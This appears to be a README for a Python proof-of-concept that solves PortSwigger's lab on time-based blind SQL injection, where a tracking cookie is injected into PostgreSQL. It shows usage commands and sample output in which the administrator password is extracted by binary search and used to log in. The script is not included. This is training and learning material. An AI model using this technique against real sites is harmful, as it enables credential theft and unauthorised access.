# Lab: Blind SQL injection with time delays and information retrieval

A Python PoC exploiting a blind SQL injection vulnerability (PostgreSQL time-based) in a cookie value, using binary search and multithreaded extraction to efficiently recover the administrator's password and log in. Built for PortSwigger's "Blind SQL injection with time delays and information retrieval" Web Security Academy lab.

## 📦 Prerequisites

Install the required dependencies before running the script:

```bash
pip install beautifulsoup4 requests
```

## 🚀 Usage

Pass the target lab instance URL directly via command line argument. The script automatically obtains a session and tracking cookie — no manual setup required.

```bash
python3 code.py <TARGET_URL>
```

**Example:**

```bash
python3 code.py https://0a75002a037a3ec180752bc8009e0061.web-security-academy.net
```

```bash
[+] Blind SQL injection with time delays and information retrieval (optimized)
[ ] Attempting blind SQL injection with time delay, using 3s as threshold
[+] Obtained tracking cookie: JmJZPPwTe257SUKx
[ ] Verify that structure of lab is as expected
[+]   DB is PostgreSQL
[+]   DB has users table
[+]   users table contains columns username and password
[+]   users table contains username administrator
[ ] Attempt to obtain password length (binary search)
[+]   Found password length: 20
[ ] Attempt to extract password (binary search, 5 thread paralleli)
[ ]   Estratti 20/20 caratteri: gjzfdl542bbuv5p56xe5
[+] Found password: gjzfdl542bbuv5p56xe5
[ ] Try to login as administrator
[+] Login as administrator successful
```
